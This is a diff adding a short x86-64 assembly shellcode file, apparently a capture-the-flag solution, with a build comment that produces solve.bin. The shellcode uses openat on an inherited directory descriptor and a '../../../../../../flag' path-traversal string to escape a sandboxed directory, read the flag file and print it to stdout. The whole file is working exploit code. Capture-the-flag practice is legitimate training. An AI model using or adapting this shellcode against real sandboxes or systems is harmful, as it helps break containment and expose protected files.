@@ -1,0 +1,29 @@
+.intel_syntax noprefix
+_start:
+    /* call openat(3, "../../../flag", int flags, mode_t mode);  */
+    mov rdi, 3
+    xor rdx,rdx
+    lea rsi,[rip+flag]
+    mov rax, 0x101
+    syscall
+
+    //read
+    mov rdi,rax
+    mov rsi,rsp
+    mov rdx,60
+    mov rax, 0
+    syscall
+
+    //write
+    mov rdi,1
+    mov rsi,rsp
+    mov rdx,60
+    mov rax,1
+    syscall
+
+    mov rdi,42
+    mov rax,0x3c
+    syscall
+flag:
+    .ascii "../../../../../../flag\0"
+//gcc a.s -nostdlib && objcopy --dump-section .text=solve.bin a.out
